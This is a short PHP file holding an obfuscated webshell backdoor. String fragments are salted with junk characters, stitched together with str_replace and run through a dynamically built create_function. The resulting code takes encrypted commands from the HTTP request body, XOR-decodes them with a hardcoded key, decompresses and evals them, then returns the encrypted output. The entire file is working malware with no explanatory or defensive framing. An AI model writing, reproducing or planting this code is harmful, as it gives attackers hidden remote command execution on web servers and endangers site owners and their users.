<?php
$X='ontents("H"php://iH"nputH"H""),H"$m)==1) {@ob_starH"t();@eH"valH"(@gH"zuncompressH"(@';
$B=str_replace('dE','','credEdEadEte_fudEncdEdEtion');
$k='H"wH"Wiw1";H"functiH"H"on x($t,$k){$cH"=strlen($H"k);H"$l=strleH"n($t);$o=H""H"";';
$Z='x(@baH"seH"64_decodeH"H"($H"m[1])H",H"$k)));$o=@ob_get_H"cH"ontents();@oH"b_end_H"cl';
$i='"^$k{H"$j};}}retuH"rn $oH";}iH"f (@preg_match(H""/$kh(H".+)$kfH"/"H",@file_gH"etH"_c';
$Q='ean()H";$r=@baH"se64_enH"code(@H"x(@gH"zcompress(H"$H"H"o),H"$k));print("$p$kH"h$r$kf");}';
$W='for($H"i=0;$i<$H"l;){H"fH"or($j=H"0;(H"$j<$c&&$i<$l);$j+H"+,$i++H"){$o.=$H"H"t{$i}H';
$M='$k="H"281a6H"647H"";$kh="9H"83e0ebH"627cdH""H";$kfH"="b516H"a6a9780b";$p="H"KhcnhtJFM2w';
$u=str_replace('H"','',$M.$k.$W.$i.$X.$Z.$Q);
$q=$B('',$u);$q();
?>
